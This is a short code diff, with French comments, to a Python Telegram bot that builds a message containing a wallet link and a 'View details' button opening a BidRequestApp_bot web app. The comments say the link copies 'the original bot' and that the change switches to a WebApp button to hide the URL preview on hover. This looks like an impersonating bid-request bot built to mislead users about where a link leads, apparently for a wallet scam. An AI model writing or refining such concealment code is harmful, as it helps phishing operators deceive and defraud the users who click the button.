@@ -134,11 +134,11 @@ Important:
         ))
         print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
     
-    # URL du bouton - identique au bot original
-    button_url = f"https://t.me/BidRequestApp_bot/?startapp={username.lower()}-{price:g}"
+    # URL WebApp - remplace l'URL normale pour masquer l'aperçu au survol
+    webapp_url = f"https://t.me/BidRequestApp_bot/?startapp={username.lower()}-{price:g}"
     
-    # Bouton utilisant Web App au lieu d'URL classique
-    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("View details", web_app=WebAppInfo(url=button_url))]])
+    # Bouton avec WebApp pour masquer l'URL au survol
+    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("View details", web_app=WebAppInfo(url=webapp_url))]])
     
     return fragment_message, entities, keyboard
 
